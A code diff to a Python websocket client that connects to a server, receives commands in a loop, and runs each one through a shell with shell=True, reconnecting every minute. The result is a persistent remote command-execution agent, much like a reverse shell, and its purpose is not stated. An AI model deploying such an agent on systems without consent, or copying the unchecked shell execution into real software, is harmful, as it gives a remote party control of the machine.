@@ -13,12 +13,12 @@ from websockets.exceptions import ConnectionClosedOK
 def handle_connection(func):
 
     @functools.wraps(func)
-    async def func_wrapped(url):
+    async def func_wrapped(url, **kwargs):
         while True:
             try:
                 async with websockets.connect(url) as ws:
                     await check_connection(ws)
-                    await func(ws)
+                    await func(ws, kwargs)
             except (ConnectionRefusedError, ConnectionClosedOK) as err:
                 print(err)
                 await asyncio.sleep(60)
@@ -40,13 +40,13 @@ async def check_connection(ws):
 
 def handle_command(command):
     proc = subprocess.Popen(
-        command.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
+        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
     )
     return proc.communicate()
 
 
 @handle_connection
-async def client(ws):
+async def client(ws, params={}):
     while True:
         command = await ws.recv()
         if command:
